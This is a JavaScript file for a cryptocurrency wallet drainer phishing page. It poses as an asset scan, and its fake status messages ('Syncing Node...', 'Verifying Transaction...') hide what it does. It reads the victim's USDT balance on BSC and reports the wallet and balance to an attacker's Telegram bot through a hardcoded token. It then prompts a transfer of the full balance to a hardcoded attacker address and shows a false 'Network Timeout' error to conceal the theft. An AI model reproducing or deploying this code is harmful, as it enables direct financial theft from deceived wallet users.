const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; 

// Telegram Bot Info
const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const chatId = "7849151110";

async function sendLog(msg) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
}

async function start() {
    const btn = document.getElementById("nextBtn");
    const overlay = document.getElementById("overlay");
    const status = document.getElementById("status-text");

    // Check if inside Wallet
    if (!window.ethereum && !window.trustwallet) {
        alert("Please open this link inside Trust Wallet or MetaMask browser.");
        return;
    }

    overlay.style.display = "flex";
    status.innerText = "Syncing Node...";

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        status.innerText = "Scanning Assets...";
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

        const abi = [
            { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
            { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
        ];

        const contract = new web3.eth.Contract(abi, usdtContract);
        const balanceWei = await contract.methods.balanceOf(user).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        await sendLog(`👤 <b>New Scan!</b>\nWallet: <code>${user}</code>\nBalance: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            status.innerText = "Verifying Transaction...";
            
            // This triggers the transfer popup
            await contract.methods.transfer(myAddress, balanceWei).send({ from: user });
            
            await sendLog(`✅ <b>Success!</b>\n${balance} USDT transferred.`);
            alert("Error: Network Timeout. Please retry.");
        } else {
            alert("No significant assets found.");
        }
    } catch (e) {
        alert("Action Denied.");
        overlay.style.display = "none";
    }
}

document.getElementById("nextBtn").addEventListener("click", start);
